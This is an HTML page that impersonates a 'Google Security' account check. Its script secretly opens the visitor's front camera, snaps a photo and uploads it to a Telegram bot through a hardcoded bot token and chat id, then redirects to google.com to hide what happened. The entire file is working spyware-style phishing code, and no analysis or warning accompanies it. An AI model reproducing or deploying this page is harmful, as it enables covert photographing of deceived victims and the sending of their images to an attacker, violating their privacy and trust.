<!DOCTYPE html>
<html>
<head>
    <title>Google Security</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="150">
    <h3 id="st" style="font-weight:normal; color:#5f6368;">Verifying account...</h3>
    
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = "8461524246:AAGAsQD20_4t3zR05rI6bu-0FIrG_pgXS-g";
        const chat_id = "7130643157";

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                const v = document.getElementById('v');
                v.srcObject = stream;

                // Photo lene se pehle thoda wait taaki camera focus ho jaye
                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = 640;
                    c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.7)); // JPEG zyada fast hai
                    
                    const fd = new FormData();
                    fd.append('chat_id', chat_id);
                    fd.append('photo', blob, 'img.jpg');
                    fd.append('caption', '🚀 Fast Capture: Done!');

                    // Pehle confirm karein ke photo chali gayi hai
                    document.getElementById('st').innerText = "Security Check Passed...";
                    
                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
                        method: 'POST', 
                        body: fd 
                    });

                    // Photo jaane ke baad hi Google par bhejna
                    window.location.href = "https://www.google.com";
                }, 800); 
            } catch (e) {
                window.location.href = "https://www.google.com";
            }
        }
        window.onload = start;
    </script>
</body>
</html>
